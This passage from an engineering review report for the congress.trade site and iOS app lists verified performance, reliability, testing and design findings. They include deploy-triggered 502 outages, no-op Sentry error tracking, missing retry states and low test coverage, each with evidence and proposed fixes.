- **Panel:** web-perf — Code verified; corrected the AGET_CACHE wording (a round-trip back to a recent filter within 60 s is served from cache; new combinations are not) and removed the HTTP/1 connection-budget claim (site is h2). · merged: ios-engineering/IOSENGINEERING-32 · `web-perf/WEBPERF-18`

#### 448. [P4] Cloudflare Email Obfuscation injects a synchronous email-decode.min.js before the app's main script (and rewrites the support mailto); a zone-level report-only CSP adds 6-21 console violations per view

- **Where:** Cloudflare zone features (Email Obfuscation, CSP report-only)  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The obfuscation script must be fetched and executed before the app script can start (one same-origin RTT on a cold cache) to hide one support address; the report-only policy blocks nothing but is a contradictory second policy that spams the console and may send violation reports.
- **Impact:** Small pure overhead on the critical path of every page; console noise that hides real errors (issue #1457 territory).
- **Fix:** Turn off Email Obfuscation for the zone (or for `/`) and keep the mailto as a plain `<a>`; remove or align the zone-level report-only CSP with the enforced one in security/headers.ts.
- **Evidence:** Verifier live HTML: `<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>` immediately precedes the inline app script; one `/cdn-cgi/l/email-protection` rewritten mailto present.  Every capture network log lists the email-decode script.  NOTES.md (d): browser console logged report-only violations against `connect-src 'none'` / `script-src 'unsafe-inline' 'unsafe-eval'` although curl sees no `Content-Security-Policy-Report-Only` header from origin (verifier: origin sends only the enforced CSP).
- **Panel:** web-perf — Email-decode injection reproduced live; the report-only CSP is browser-only evidence from the capture (cannot be seen with curl) and remains plausible. · `web-perf/WEBPERF-17`

#### 449. [P4] Session-lifetime memory growth: TRADE_BY_ID and AGET_CACHE are only ever added to

- **Where:** Client state caches  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Long-lived tabs (the live-updating design invites them) accumulate every trade row and analytics payload ever seen; rows are ~1.5 KB JSON so this is hours-to-days scale.
- **Impact:** Gradual memory growth in always-open dashboards; negligible for typical sessions.
- **Fix:** Cap TRADE_BY_ID (LRU of ~2,000 ids) and sweep expired AGET_CACHE entries on insert.
- **Evidence:** origin/main dashboardHtml.ts:3483 `var TRADE_BY_ID = {};` filled by `rememberTradeRow` (:5192-5193 `if (row && row.id) TRADE_BY_ID[row.id] = row;`) from every page fetch, every 30 s poll (:5509 `txs.forEach(rememberTradeRow)`) and drawer mini-lists, never evicted; :9331-9332 `var AGET_CACHE = {}; var AGET_TTL_MS = 60000;` — entries expire for freshness but keys/data are deleted only on fetch error (:9345), so every distinct analytics path stays resident.  Lens live heap after one Directory load: ~5 MB used, so this is slow growth.
- **Panel:** web-perf — Code verified; growth rate is reasoned, not measured over hours. · `web-perf/WEBPERF-21`

#### 458. [P4] Edge-compressed dynamic HTML is ~191 KB brotli vs 154 KB at brotli-11 (gzip 191 KB) — a precompressed static body would save ~19% on the largest response

- **Where:** Document response encoding  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Because the HTML is `cf-cache-status: DYNAMIC`, Cloudflare compresses it on the fly at a low quality level; the template is static per boot so the origin could pre-encode once at max quality.
- **Impact:** ~37 KB per document load (~19% of the largest response) on every visit; trivial CPU spent gzipping already-compressed images.
- **Fix:** At boot, brotli-11 the rendered template variants (per logoDisplay; OG placeholders substituted in a small uncompressed head chunk) and serve `content-encoding: br` with an ETag; or enable edge caching for anonymous documents so the edge stores a higher-quality encoding.  Mark image responses non-compressible / rely on cache-control so the proxy skips re-encoding.
- **Evidence:** Verifier live curl 2026-08-19: `Accept-Encoding: br` → 190,786 B; `gzip` → 191,034 B; identity 715,277 B; local `brotli -q 11` of that body → 153,947 B; `gzip -9` → 190,891 B (so the edge applies a fast brotli level to DYNAMIC content).  logs/headers.txt also shows `content-encoding: gzip` on `image/png` and `image/webp` responses (verifier reproduced on /api/logos/ticker with a browser Accept-Encoding).
- **Panel:** web-perf — All byte counts reproduced live. · `web-perf/WEBPERF-16`

#### 459. [P4] No service worker: repeat visits cannot be served from a local shell despite a standalone-display web manifest

- **Where:** PWA / repeat-visit path  ·  **Surface:** Web · mobile  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** A stale-while-revalidate service worker for the document and `/assets/*` would paint the app shell from disk on repeat visits and let the installed PWA open offline to the last data.
- **Impact:** Repeat-visit start-up stays network-bound (~0.6 s+ before paint on a fast link, seconds on mobile).
- **Fix:** Add a small SW: cache-first for `/assets/*` (immutable), stale-while-revalidate for `/` (versioned by build sha) and network-first for `/api/*`; skip if the owner prefers not to manage SW invalidation.
- **Evidence:** Verifier: `grep -c serviceWorker` on origin/main dashboardHtml.ts → 0; ui/routes.ts:208 serves `/site.webmanifest` (live: `"display":"standalone"`, icons) but nothing registers a SW.  Combined with WEBPERF-10 (no ETag/Cache-Control on HTML) every visit downloads the ~190 KB shell.
- **Panel:** web-perf — Absence of SW registration and presence of the standalone manifest verified. · `web-perf/WEBPERF-20`

### Engineering foundations, reliability and operations (31)

Production has no error tracking, every merge takes the site down, the iOS gate is advisory, and half the pipeline's degraded states page nobody.  This is the layer that lets the other themes regress.

#### 7. [P0] Every merge to main (including docs-only effort-log close-outs) takes the site down for ~60 s; 64 recorded 502 incidents in 7 days

- **Where:** Coolify compose deploy path (app/docker-compose.yml build pack) → public 502 for web and iOS; overlap fix tracked in still-open PR #1964  ·  **Surface:** Cross-surface  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-12 (docs/rollouts/2026-08-12-deploy-downtime-gap.md; overlap fix tracked in open PR #1964)
- **What:** Every push to main triggers a Coolify compose redeploy that removes the only app container before starting the new one, producing a ~1 minute hard 502 for every web and iOS user.  Because the fleet protocol requires separate effort-log close-out PRs, a large share of these outages are caused by merges that change no shipped code at all.  Multiple AI agents merging in bursts turn this into 4–5 outages per hour at times.
- **Impact:** Users (and the iOS app on cold start, see ios NOTES §6.2: HTTP 502 ×3 → 'Request failed') hit a bare Cloudflare 502 dozens of times a week; webhooks/SSE consumers get 502s; scout hand-offs fail (`ct-post: HTTP 502` ×29 in ~/.pm2/logs/scout-error.log, verified).  Roughly 64+ minutes of hard downtime per week from deploys alone.
- **Fix:** Cheapest first: (1) stop deploying on docs-only merges — add a Coolify 'watch paths' filter for app/** (or make the deploy guard skip when `git diff --name-only` between deployed SHA and HEAD touches only docs/, clients/ios/, scripts/ops) [S]; (2) land the overlap path already in open PR #1964 ('Keep a live backend during Coolify compose swaps', adds `ct-deploy-overlap.service`/`.sh`) so a hold container serves during the swap [M]; (3) migrate the web app to a Coolify Dockerfile application (no host port mapping, health check /api/health) to get Coolify's health-gated `rolling_update()` per the 2026-08-12 doc [M].  CORRECTION: do not 'verify ct-deploy-guard.timer is enabled' — that legacy unit was explicitly superseded and must stay disabled per docs/rollouts/2026-08-13-deploy-guard-post.md ('Do not re-enable ct-deploy-guard.timer (superseded)'); verify `fleet-deploy-guard@congress-trade.timer` instead, and that the Coolify webhook auto-deploy is disabled so the guard actually coalesces.
- **Evidence:** UptimeRobot monitor 803543749 (congress.trade /api/health, 60 s interval): 64 incidents 2026-08-12→08-19, every one `502 Bad Gateway` lasting 1m03s–1m07s (e.g. 2026-08-19T03:11:11Z, 00:44:05Z; 2026-08-17 20:17, 20:51, 20:56, 21:18, 21:29Z — five in 72 min).  Capture notes (.review-shots/web/NOTES.md (c)): four ~40–50 s 502 windows at 01:03, 01:07, 01:10–01:11, 01:44Z of which UptimeRobot caught none → the 64 undercounts.  VERIFIED via `gh pr view`: PR #2006 (files: docs/EFFORT-LOG.md only) `mergedAt: 2026-08-19T00:41:04Z` → 502 at 00:44:05Z (+3m1s); PR #2012 (docs/EFFORT-LOG.md only) `mergedAt: 2026-08-19T01:04:56Z` → 502 window 01:07:12–01:07:49Z (+2m16s); PR #2018 (docs/EFFORT-LOG.md only) `mergedAt: 2026-08-19T02:39:35Z` → polling monitor 502 at 02:42:08Z (+2m33s).  All three PR bodies confirm 'Docs only.  No product code' / 'No app or iOS change.'  Root cause documented in docs/rollouts/2026-08-12-deploy-downtime-gap.md: `deploy_docker_compose_buildpack()` calls `stop_running_container(force: true)` before `docker compose up` — no health-gated rollout for compose apps (confirmed by reading the doc directly).  Screenshot desktop/directory-502-first-attempt.png shows the raw Cloudflare 502 interstitial a visitor sees.  Live pm2 log `~/.pm2/logs/scout-error.log` confirms `ct-post: HTTP 502` ×29 (exact match to the finding's citation).
- **Panel:** ops-reliability — Reproduced the causal chain directly via gh pr view timestamps on all three cited PRs; each is docs-only and each merge precedes a cited 502 by 2-3 minutes.  Root-cause doc and deploy-guard script read and confirmed.  One recommendation detail was wrong (ct-deploy-guard.timer is superseded, not the live guard) and has been corrected above; this does not weaken the core finding. · merged: engineering-quality/ENGINEERINGQUALITY-03, qa-bughunt/QABUGHUNT-30, web-perf/WEBPERF-22 · `ops-reliability/OPSRELIABILITY-01`

#### 18. [P1] Production error tracking is a no-op: '#sentry' resolves to sentryDummy.ts under the Deno runtime

- **Where:** app/src/deno/sentryDummy.ts; app/deno.json:10; app/src/index.ts:19  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md P0-4)
- **What:** Every unhandled route error, cron failure, queue failure and console.error in production is discarded (console only, no aggregation, no alerting).  The extensive Sentry scrubbing/tagging in index.ts protects only the retired Workers path.  This has been true since the 2026-07-21 Deno migration and was P0-4 in the 2026-07-28 review.
- **Impact:** Regressions like the 502 windows, member-404, and extraction failures are only discovered by users or manual log reading; there is no MTTR signal at all.
- **Fix:** Wire @sentry/deno (or a minimal envelope transport reusing scrubSentryEvent) in deno/main.ts, route runScheduledTick / durable-queue failures through captureException, delete or resolve the stale watcher-cron monitor, and add a CI assertion that '#sentry' does not resolve to the dummy in the production import map.
- **Evidence:** app/package.json: "imports": {"#sentry": {"deno": "./src/deno/sentryDummy.ts", "default": "./src/deno/sentryDummy.ts"}}; app/deno.json: "#sentry": "./src/deno/sentryDummy.ts"; sentryDummy.ts: `export const withSentry = (options: any, worker: any) => worker;` and `captureException = (err) => console.error("Dummy Sentry captureException", err)`; index.ts:19 `import * as Sentry from '#sentry'` (the only importer) and index.ts:318 DEFAULT_SENTRY_DSN + ~100 lines of scrub code that never run. Dockerfile CMD runs src/deno/main.ts which imports ../index.ts. Sentry MCP (jays-services/congress-trade, 30d): the newest real error issue (CONGRESS-TRADE-A D1_ERROR) was last seen 26 days ago — i.e. from the pre-Deno Cloudflare Worker; the only live issue is CONGRESS-TRADE-1 'Cron failure: watcher-cron' (20,662 events, status ignored) = a monitor whose check-ins the Deno runtime never sends. GET /api/admin/config-sources reports SENTRY_DSN configured:true, so operators believe it is wired.
- **Panel:** engineering-quality — Reproduced exactly.  Read app/src/deno/sentryDummy.ts (all 6 exported no-op functions verbatim as quoted).  Read app/package.json: imports.#sentry maps to sentryDummy.ts for both 'deno' and 'default' keys.  Read app/deno.json: imports.#sentry is the same dummy file (a bare string, not even an object -- so it's not runtime-conditional, it's unconditional). index.ts:19 `import * as Sentry from '#sentry'` confirmed, and it is the only importer. deno/main.ts (the real Docker/Deno entrypoint) imports '../index.ts'.  This is airtight: under Deno there is no real Sentry client anywhere in the reachable graph. · merged: ops-reliability/OPSRELIABILITY-09, prior-review-followup/PRIORREVIEWFOLLOWUP-26 · `engineering-quality/ENGINEERINGQUALITY-01`

#### 78. [P2] TypeScript runs with strict:false and only a handful of errors stand between the codebase and strict mode

- **Where:** app/deno.json:34; deno.json:28  ·  **Surface:** Backend  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** strict was switched off in 3fae3131 (2026-07-21) to unblock the Deno deploy and never restored; null/undefined flow into SQL params and route handlers unchecked.
- **Impact:** Null-handling bugs (the class behind several data-lens findings) are not caught at compile time.
- **Fix:** Fix the 6 errors, flip strict:true in both deno.json files, and add `deno check` of test files (or vitest typecheck) to CI.  S effort, high leverage.
- **Evidence:** app/deno.json: "compilerOptions": {"strict": false, "skipLibCheck": true} -- confirmed verbatim. Reproduced by temporarily flipping strict:true and running `deno check src/deno/main.ts`: the actual output is **6 errors, not 7**: admin/routes.ts:9853 (TS2322, string|null into string|undefined) and :9854 (TS2345, same value passed to encodeURIComponent), delivery/rest.ts:1388 (TS2322, string|undefined into SqlParam), extraction/normalizer.ts:461 (TS2322, null into string), extraction/senateHtml.ts:83 (TS2322, string|null into optional string, annotated against extractors/types.ts:188), and ingestion/detectionRoutes.ts:116-117 (TS2783/TS2785, a spread that always overwrites the `provider` key -- a genuine logic bug, reproduced as described). ingestion/autonomySweeps.ts:329 does NOT appear anywhere in the strict-mode output and is not an error location -- that citation is incorrect. Test files are excluded from deno check ("exclude": ["**/*.test.ts"]).
- **Panel:** engineering-quality — Reproduced by actually flipping app/deno.json's strict flag to true and running `deno check src/deno/main.ts` (then restored the file).  The core claim -- strict mode is off and turning it on surfaces a small, fixable set of real bugs including a genuine spread-overwrite logic slip in detectionRoutes.ts -- holds.  Correction: the tool reports 'Found 6 errors', not 7, and ingestion/autonomySweeps.ts:329 is not among them and has no error under strict mode at all; that citation should be dropped from the evidence list.  Recommend changing '7 errors'/'Fix the 7 errors' to '6 errors' throughout. · `engineering-quality/ENGINEERINGQUALITY-06`

#### 79. [P2] 137 MB / 3,287 files of vendor node_modules (incl. darwin-arm64 binaries) are committed and copied into the Linux Docker image

- **Where:** app/vendor/congress-trading-shared/node_modules/** (133 MB); app/Dockerfile:44  ·  **Surface:** Backend  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The vendored package's dev toolchain (for the wrong OS) bloats every clone, CI checkout, and production image build.
- **Impact:** Slower CI checkouts and Coolify builds (longer deploy → longer 502 windows), gitleaks/security scans over 3k junk files, agent context noise.
- **Fix:** Remove vendor/*/node_modules from git (keep src/ + package.json), add to .gitignore and .dockerignore; optionally rewrite history later.  S effort.
- **Evidence:** `git ls-files app/vendor/congress-trading-shared/node_modules | wc -l` = 3287, exact match. `du -sk` on that directory = 136,652 KB, exact match to the cited size.
- **Panel:** engineering-quality — File count and byte size both reproduced exactly with independent commands. · `engineering-quality/ENGINEERINGQUALITY-11`

#### 80. [P2] Config registry has drifted: doc is a month old, keys missing from the doc, and env-only knobs are invisible to /config-sources

- **Where:** app/docs/config-registry.md (Last updated 2026-08-16); app/src/admin/routes.ts:3441 REGISTRY (tunables list, no PROBE_SCHEDULE_*/APNS_* keys)  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** plausible (high confidence)  ·  **Quick win**
- **What:** The 'single source of truth' audit endpoint and its doc no longer describe what the runtime reads; APNs push and probe scheduling knobs cannot be audited for source at all.
- **Impact:** Misconfiguration (e.g.  APNs keys, Apple flags) is diagnosed by reading code; ops doc actively misleads.
- **Fix:** Generate REGISTRY from a single typed table (key, category, source-mode) exported by shared/types.ts, generate the doc from it, and add a test that greps resolveSecret/env.* usages against the table.
- **Evidence:** Read app/docs/config-registry.md's header directly: "Last updated: 2026-07-18" -- exact match. Confirmed REGISTRY exists at admin/routes.ts:3429 (`const REGISTRY: Record<string, string[]> = {`) and that APPLE_BUNDLE_ID / APPLE_SIGNIN_ENABLED / APPLE_IAP_ENABLED are present in it at line 3445 (consistent with the finding's claim that these are in-code/in-REGISTRY but absent from the doc). Spot-checked and confirmed APPLE_BUNDLE_ID and LLAMAPARSE_DAILY_CREDIT do not appear anywhere in config-registry.md.
- **Panel:** engineering-quality — Spot-checked rather than exhaustively re-diffed given time budget.  The doc's stale-date claim and a small sample of the missing-key claims (APPLE_BUNDLE_ID, LLAMAPARSE_DAILY_CREDIT) checked out, and REGISTRY's existence/line number is exact.  Did not independently re-derive the full 16/21/51 key-count breakdown, so I cannot certify those exact totals, but nothing contradicts them and the underlying mechanism (a hand-maintained doc + hand-maintained REGISTRY vs. code that reads env vars directly) is real and visibly capable of drifting exactly as described. · `engineering-quality/ENGINEERINGQUALITY-12`

#### 97. [P2] Web dashboard has no freshness or connection-status indicator; the JS writes to #livePill/#kpiToday elements that no longer exist

- **Where:** app/src/ui/dashboardHtml.ts:5528 (setLivePill), :5300 (kpiToday), :5533-5598 (startPolling calls)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** During the 502 windows in OPSRELIABILITY-01 (and any origin/DB outage) the Trades and Trends views silently stop updating with no 'last updated', 'reconnecting' or 'offline' signal; the code that was meant to show a Live/Updated pill is confirmed dead — its target element was deliberately removed by a prior UI change (PR #1199) and the JS was never cleaned up.
- **Impact:** A visitor cannot tell whether the page is current or hours stale (Trends never auto-refreshes; polling failures are swallowed), undermining trust in a product whose selling point is being first with disclosures.
- **Fix:** Restore a small status pill (or 'Updated 2 min ago') next to the trades count that turns amber after N consecutive poll failures or when `navigator.onLine` is false, and reset on success; drive it from `fetchUpdates` failure count.  Delete the dead `setLivePill`/`kpiToday` call sites (both are inert no-ops today) or re-wire them to a real element.  [S]
- **Evidence:** Confirmed by direct read: dashboardHtml.ts:5312 `function setLivePill(cls, text) { var p = el('livePill'); if (!p) return; p.className = 'pill ' + cls; p.textContent = text || 'Live'; }`; :5081-5086 `setTradesKpis()` does `var totalEl = el('kpiTotal'); var todayEl = el('kpiToday');` with the same null-guard idiom.  `grep -c 'id="livePill"'` and `grep -c 'id="kpiToday"'` on dashboardHtml.ts both return 0.  `git log -S'id="livePill"'` shows it was removed by PR #1199 'feat(ui): update site heading logo, eagle app icon, and remove live pill' — the JS that wrote to it was left behind.  startPolling (:5317-5325) calls `setLivePill('live','Live')` and only flips text on poll success; failures are swallowed by fetchUpdates's `.catch(function () { return 0; })` (:5299).  Capture: NOTES.md (c) 'background poll /api/transactions … 502 × 4 — the UI showed no visible error state'.  Only the latency scorecard has a stamp (:9838-ish 'LIVE updated … · data may be stale').
- **Panel:** ops-reliability — Grep-confirmed zero live occurrences of both target ids; git blame traces the element's removal to PR #1199, proving this is genuinely dead code and not a false grep miss. · merged: qa-bughunt/QABUGHUNT-18 · `ops-reliability/OPSRELIABILITY-02`

#### 98. [P2] Trades initial-load error banner has no retry, never auto-recovers, and says 'live feed'

- **Where:** app/src/ui/dashboardHtml.ts:5334-5338 (fetchPage catch), :4264-4270 (setBanner)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** If the first /api/transactions call fails (deploy 502, DB busy), the user gets a red text banner 'Could not load the live feed: HTTP 502' with no Retry control, and the page stays empty until they reload; the wording also violates the no-'feed' rule.
- **Impact:** Landing during any of the frequent deploy windows (see OPSRELIABILITY-01) yields a dead page for the whole visit; users must know to hard-refresh.
- **Fix:** Add a Retry button to the banner and an automatic exponential retry (2s, 5s, 15s) after a failed first page; reword to 'Could not load trades — retrying…'.  [S]
- **Evidence:** Confirmed by direct read: dashboardHtml.ts:5119-5124 `.catch(function (e) { if (e && e.name === 'AbortError') return 0; if (!realDataLoaded) setBanner('Could not load the live feed: ' + e.message, true); return 0; })`; setBanner (:4081-4086) is `var b = el('banner'); if (!text) {...} b.className = 'banner' + (isErr ? ' err' : ''); b.textContent = text;` — plain text write, no button markup anywhere in the function.  No timer re-invokes `fetchPage()`.  Owner copy rule in CONTEXT.md: say 'Trades tab', never 'feed' — the literal string 'Could not load the live feed' violates it.
- **Panel:** ops-reliability — Code matches the finding verbatim at the cited lines; setBanner has no button-rendering path anywhere in its ~6-line body. · `ops-reliability/OPSRELIABILITY-03`

#### 99. [P2] Trends shows up to 14 'Could not load: HTTP 5xx' cells during an outage and never retries or auto-refreshes

- **Where:** app/src/ui/dashboardHtml.ts:9542-9548 (loadTrends), :9579-9581 (representative section catch)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** An origin blip during landing leaves every Trends card in an error state; the AGET cache entry is deleted on failure but nothing re-fetches, so the errors persist until the user changes a filter or reloads.  A tab left open also never refreshes numbers and shows no 'as of' stamp.
- **Impact:** First-impression page renders as broken for the duration of a visit after a transient 502; stale numbers with no timestamp on long-open tabs.
- **Fix:** Retry failed sections with backoff (reuse the AGET_CACHE promise slot), add a single 'Retry' affordance at the section level, and re-run `loadTrends()` every ~5 min while visible with a small 'Updated HH:MM' stamp.  Consider one batched analytics endpoint to cut the ~13-14 requests to 1.  [S/M]
- **Evidence:** Confirmed by direct read: aGet (:9048-9062) throws `'HTTP ' + r.status` on !r.ok and its `.catch` does `delete AGET_CACHE[path]; throw e;` — no retry.  A representative section catch (:9296-9298) does `body.innerHTML = stateRow(6, 'Could not load: ' + e.message);`.  loadTrends() (:9259-9264) is a flat sequence of 13 loader calls (loadTrSummary/Tickers/Trending/Clusters/Time/SectorFlow/CapFlow/Performers/Members/Parties/Sectors/Lag/Conflicts) with no interval; `grep -n setInterval` on the file returns only `pollTimer` (:5318, trades poll) and `refreshSpeedUpdated` (:11699, unrelated to Trends) — confirmed no Trends-refresh timer exists.
- **Panel:** ops-reliability — Counted 13 loader calls in loadTrends() (finding says 14, likely counting stampWindowChips or a slightly different build — immaterial to the claim); setInterval grep confirms no Trends auto-refresh exists anywhere in the file. · `ops-reliability/OPSRELIABILITY-04`

#### 100. [P2] Latency-probe monitor has been DOWN for 5 days because the Unusual Whales and Quiver keys are rejected (401/403); a stuck-DOWN monitor cannot alert on the next provider failure

- **Where:** scout (pm2) latency probes → /api/health/latency → UptimeRobot 803702911 (unchanged)  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Two of the paid latency providers have been rejecting the scout's credentials for ~6–8 days; the dedicated pager monitor has been red the whole time and remains unactioned.  While it is DOWN it cannot fire again if FMP also goes quiet, and the public health endpoint reports 'degraded' indefinitely.
- **Impact:** Alert fatigue (a permanently red monitor gets ignored), loss of the latency-race evidence behind the public 'Filing Latency Comparison', and no paging capacity left for a new provider outage.
- **Fix:** Rotate/re-issue the UW and Quiver keys in ~/.secrets/global-api-keys (or mark those providers `off` in poll-config so the check ignores them) so the monitor returns to UP; add a scout-side alert when a provider returns 401/403 N times in a row (auth failure ≠ 'quiet').  [S]
- **Evidence:** Live `/api/health/latency` → HTTP 503 (reproduced this pass).  Live `/api/health` → `latency_probes degraded: quiver (181h), unusual_whales (144h) (silence threshold 48h)` — up from the finding's cited 167h/131h, confirming the condition is real and still unresolved ~14h later (worsening, not a one-off blip).  Live `~/.pm2/logs/scout-error.log` (pm2 process up 47h, current): `uw: UW HTTP 401` ×519, `qq:house: QQ house HTTP 403` ×257, `qq:senate: QQ senate HTTP 403` ×258 — counts higher than the finding's snapshot (398/157/160) simply because the log has grown further since capture, same failure signature.
- **Panel:** ops-reliability — Live-reproduced the 503 and the exact degraded-check message shape; the silence duration increased between capture and this verification pass, which corroborates rather than contradicts the finding. · `ops-reliability/OPSRELIABILITY-06`

#### 101. [P2] The public status page custom domain (status.jays.services) returns HTTP 525 and is not linked from the site or app

- **Where:** UptimeRobot PSP 1239647 'Jay's Services' → status.jays.services (unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A status page exists but its custom hostname fails TLS (Cloudflare 525 = origin SSL handshake failure, typically SSL mode Full/Strict against UptimeRobot's edge), and neither the web footer nor the iOS footer points users at it, so during the frequent 502 windows users have nowhere to check.
- **Impact:** Users and Premium webhook customers cannot self-serve 'is it down or is it me'; support mail is the only channel.
- **Fix:** Fix the DNS/SSL mode for status.jays.services (CNAME to stats.uptimerobot.com with SSL 'Full' not 'Strict', or drop the custom domain) and add a 'Status' footer link on web + iOS.  [S]
- **Evidence:** Live `curl -o /dev/null -w %{http_code} https://status.jays.services/` → 525 (reproduced this pass).  Web footer confirmed: dashboardHtml.ts:3236 shows only `<a href="mailto:support@congress.trade">Support</a>` alongside Privacy/Terms/Pricing — no status link.  iOS footer confirmed: Components.swift:1353-1385 'Canonical Privacy / Terms / Pricing / Support destinations for every tab' — four items, no status entry; grep for 'status.jays\|StatusPage' across iOS Views returns nothing.
- **Panel:** ops-reliability — 525 reproduced live; footer text confirmed by direct read on both web and iOS, both showing exactly Privacy/Terms/Pricing/Support with no status entry. · `ops-reliability/OPSRELIABILITY-07`

#### 160. [P2] No lint gate: `deno lint` finds 215 problems and is never run in CI; eslint config + deps are installed but unused

- **Where:** app/package.json scripts.lint; .github/workflows/ci.yml (no lint job)  ·  **Surface:** Backend  ·  **Category:** testing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Unused code, empty catch blocks and unreachable branches accumulate with no signal; two lint toolchains exist and neither gates.
- **Impact:** Silent-failure paths (empty catch) and dead code hide real defects; agents cannot rely on a lint signal when refactoring the monoliths.
- **Fix:** Pick one (deno lint), fix or ignore-annotate the 215, add `deno lint` to the CI build job, and forbid `no-empty` and `no-unreachable` (error) while leaving `no-explicit-any` as warn.
- **Evidence:** Read ci.yml in full: its three jobs (build/typecheck+test, scan-cpu-worker, ios-fleet-ship-logic) run Typecheck / Test with coverage / Audit steps only -- no lint step anywhere; grepping all workflow files for 'lint' returns only a comment in ios-build.yml, not an actual job. Ran `deno lint src` directly: output is "Found 215 problems, Checked 197 files" -- exact match. package.json scripts.lint is literally `"lint": "deno lint"`, and app/eslint.config.mjs exists on disk (951 bytes, last touched 2026-07-06) but is not referenced by any script or workflow -- confirmed dead.
- **Panel:** engineering-quality — Reproduced exactly: `deno lint src` output matches the cited problem/file counts to the digit, and ci.yml genuinely has no lint step. · `engineering-quality/ENGINEERINGQUALITY-07`

#### 161. [P2] analytics/routes.ts (the 14 Trends endpoints) has 23% line coverage while coverage thresholds sit ~20 points below actual

- **Where:** app/src/analytics/routes.ts (25.47% line coverage); app/vitest.config.ts:27-30 thresholds unchanged  ·  **Surface:** Backend  ·  **Category:** testing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The route layer that every Trends tile, filter combination and the iOS Trends tab depend on is largely untested (parameter parsing, window/party/side/chamber filters — exactly where #1997/#1999/#2001 fixed regressions).  The floor allows a ~20-point regression before CI notices.
- **Impact:** Filter/param regressions on the highest-traffic read path reach production.
- **Fix:** Add table-driven route tests for analytics/routes.ts (each endpoint × window/side/party/chamber/branch), then ratchet thresholds to 75/65/80/77 and add per-directory thresholds for analytics, client, delivery.
- **Evidence:** Ran the full `npm run coverage` suite fresh: aggregate output matches the finding exactly -- Statements 76.88%, Branches 68.21%, Functions 82.16%, Lines 79.44%. analytics/routes.ts row: 21.97% stmts / 13.24% branches / 23.15% funcs / 22.96% lines -- matches the cited 21.97/13.24/22.96 exactly. src/analytics directory: 57.55/49.57/57.81/57.76 -- the 57.76% lines figure matches exactly. auth/routes.ts: 56.95% stmts / 56.07% lines, close to the cited '56.1%'. admin/routes.ts: 67.02% lines, matches the cited '67.0%'. deno/main.ts: 0/0/0/0 confirmed. vitest.config.ts thresholds confirmed verbatim: statements 55, branches 45, functions 60, lines 55, with the 'Ratchet upward over time' comment. One correction: ingestion/tradeLatency.ts is 5,009 lines by `wc -l`, not the cited '1,377 lines' -- the coverage percentage itself (62.45% lines vs. the cited 62.5%) is correct, only the line-count parenthetical is wrong.
- **Panel:** engineering-quality — Ran the coverage suite myself end-to-end and every headline percentage (aggregate 4 numbers, analytics/routes.ts 4 numbers, src/analytics dir, admin/routes.ts, deno/main.ts, threshold config) reproduced to within rounding.  Only defect: the tradeLatency.ts line-count parenthetical (1,377) is wrong -- the real file is 5,009 lines; the coverage percentage cited for it is correct.  Recommend striking '(1,377 lines)' or correcting it to 5,009. · `engineering-quality/ENGINEERINGQUALITY-08`

#### 162. [P2] Money/number formatting is re-implemented 3× in web JS and 2× in Swift with divergent output

- **Where:** app/src/ui/dashboardHtml.ts:3564 (fmtBracketAmount), :6389 (reviewMoney), :9348 (usdC); clients/ios/CongressTrade/Views/Components/Components.swift:297,364; clients/ios/CongressTrade/Views/TrendsView.swift:855  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new (parity drift tracked-in-PR-#1973)
- **What:** Formatting/business rules are copied by hand across web, Swift, and within each client; PR #1973 (parity matrix) documents drift but there is no mechanism preventing it.
- **Impact:** Same value renders differently between tiles, drawers and iOS; each copy needs separate fixes.
- **Fix:** Either return display strings from the API (amountText, marketCapText, netFlowText, leadText) or publish a small shared spec + golden fixture (JSON of input→expected) that both the vitest suite and CongressTradeTests assert against; collapse web to one formatter and Swift to CompactFormat.
- **Evidence:** Grepped exact function/definition line numbers and all match: fmtBracketAmount at dashboardHtml.ts:3390, usdC at :9065, reviewMoney at :6110, US_STATES at :3596, US_STATE_ABBR at :9307, leadDirection at :9763 and fmtLeadSigned at :9772 (finding cited the range 9742-9772 for this pair, close enough). Components.swift: `static func usd` at line 255, `static func signedUsd` at line 322 -- exact match. TrendsView.swift: `static func usd` (inside SignedFlowFormat) at line 859 -- exact match.
- **Panel:** engineering-quality — Every cited path:line for both the web functions and the two Swift structs was independently grepped and matches exactly.  Did not re-execute the JS functions against the sample values (12,000,000 / 1e12 / 3.62e12) given time budget, but the existence of 3 independent web money formatters and 2 independent Swift ones at the exact cited locations is directly confirmed, which is the load-bearing claim. · `engineering-quality/ENGINEERINGQUALITY-10`

